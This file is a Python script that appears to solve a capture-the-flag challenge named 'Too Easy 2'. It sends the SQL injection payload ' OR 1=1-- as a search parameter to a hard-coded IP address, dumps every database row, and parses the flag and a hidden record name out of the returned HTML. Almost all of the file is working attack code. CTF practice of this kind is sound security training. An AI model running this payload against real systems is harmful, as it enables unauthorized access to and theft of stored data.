#!/usr/bin/env python3
"""
Too Easy 2 - CTF Challenge Solution
SQL Injection to extract dummy data left by the developer
"""

import requests

TARGET_URL = "http://13.53.139.173:9000/"

def exploit():
    """
    Exploit SQL injection vulnerability to dump all records
    including hidden dummy data left by the developer.
    """
    # SQL injection payload - classic OR 1=1 to return all rows
    payload = "' OR 1=1--"

    response = requests.get(TARGET_URL, params={"search": payload})

    print("[*] Sending SQL injection payload: ' OR 1=1--")
    print(f"[*] Target: {TARGET_URL}")
    print()

    # Check if we got the flag in the response
    if "flag{" in response.text:
        # Extract the flag using simple string parsing
        start = response.text.find("flag{")
        end = response.text.find("}", start) + 1
        flag = response.text[start:end]

        # Find the dummy data entry name (appears before the flag)
        # Looking for the result card with the flag
        dummy_start = response.text.rfind('<div class="result-name">', 0, start)
        dummy_end = response.text.find('</div>', dummy_start)
        dummy_name_html = response.text[dummy_start:dummy_end]
        dummy_name = dummy_name_html.split('>')[-1]

        print("[+] SUCCESS! Found dummy data left by Reggie:")
        print(f"    Name: {dummy_name}")
        print(f"    Flag: {flag}")
        return flag
    else:
        print("[-] Flag not found in response")
        return None

if __name__ == "__main__":
    exploit()
